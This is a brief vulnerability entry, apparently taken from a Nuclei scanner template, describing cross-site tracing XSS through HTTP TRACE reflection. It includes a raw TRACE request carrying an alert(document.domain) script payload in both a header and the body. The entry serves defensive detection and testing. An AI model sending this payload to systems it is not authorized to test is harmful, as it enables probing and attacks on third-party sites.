# Vulnerability: Cross Site Tracing - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`cross-site-tracing-xss.yaml`)

## Description
Cross-site scripting vulnerability was discovered via HTTP TRACE method reflection. The TRACE method reflects the request body back in the response, which can beexploited for XSS attacks when user input is reflected without proper sanitization.

## Vulnerable Code Pattern / Exploit Payload
```http
TRACE / HTTP/1.1
Host: {{Hostname}}
Header: <script>alert(document.domain)</script>
Content-Length: 27

<script>alert(document.domain)</script>
```

